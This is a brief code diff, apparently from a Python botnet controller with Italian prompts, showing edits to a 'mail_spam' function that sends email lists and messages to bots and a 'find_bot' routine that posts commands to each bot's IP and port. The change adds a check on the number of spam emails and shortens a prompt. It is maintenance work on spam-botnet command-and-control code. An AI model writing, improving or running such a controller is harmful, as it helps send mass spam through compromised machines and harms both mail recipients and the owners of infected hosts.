@@ -172,6 +172,10 @@ def mail_spam():
 
         number_of_mails = int(input("Quante email vuoi inviare? "))
 
+        if number_of_mails < 1:
+            print("Numero di email non valido")
+            return
+
         data = {
             "emails": emails,
             "message": message,
@@ -196,7 +200,7 @@ def find_bot(path, method, j=None):
             for client in clients:
                 requests.post(f"http://{client[0]}:{client[1]}/{path}", json=j)
     else:
-        client_ip = input("Inserisci l'Ip del bot di cui vuoi sapere le info: ")
+        client_ip = input("Inserisci l'Ip del bot: ")
         c = next((client for client in clients if client[0] == client_ip), None)
         if c is None:
             print("Bot non trovato")
